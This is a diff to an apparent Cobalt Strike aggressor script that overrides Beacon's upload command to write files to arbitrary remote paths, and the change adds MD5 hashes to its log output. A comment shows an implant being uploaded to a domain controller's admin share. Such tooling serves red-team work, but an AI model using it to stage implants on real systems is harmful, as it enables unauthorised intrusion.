@@ -3,6 +3,8 @@
 # remote location. By default, the built-in upload command puts uploaded file to the CWD.
 # This script lets us override that behavior.
 #
+# In addition - the upload command will print uploaded file's MD5 hash value, for traceability.
+#
 # -------------------------------------------
 # beacon> upload implant.exe \\DC1\c$\windows\temp\implant.exe
 # [*] Tasked Beacon to upload file (size: 929.25KB) from: (implant.exe) to: (\\DC1\c$\windows\temp\implant.exe)
@@ -49,7 +51,7 @@ sub interpretSize {
 }
 
 alias upload {
-    local('$bid $f $localpath $remotepath $content');
+    local('$bid $f $localpath $remotepath $content $algo $md $digest $hash');
     ($bid, $localpath, $remotepath) = @_;
 
     if($localpath is $null || strlen($localpath) == 0) {
@@ -87,7 +89,14 @@ alias upload {
         return;
     }
 
-    btask($1, "Tasked Beacon to upload file (size: " . interpretSize(strlen($content)) . ") from: ( $+ $localpath $+ ) to: ( $+ $remotepath $+ )");
+    $algo = "MD5";
+    $md = [java.security.MessageDigest getInstance: $algo];
+    $digest = [$md digest: $content];
+
+    $hash = [javax.xml.bind.DatatypeConverter printHexBinary: $digest];
+    $hash = lc($hash);
+
+    btask($1, "Tasked Beacon to upload file (size: " . interpretSize(strlen($content)) . ", md5: " . $hash . ") from: ( $+ $localpath $+ ) to: ( $+ $remotepath $+ )");
 
     bupload_raw!($1, $remotepath, $content, $localpath);
 }
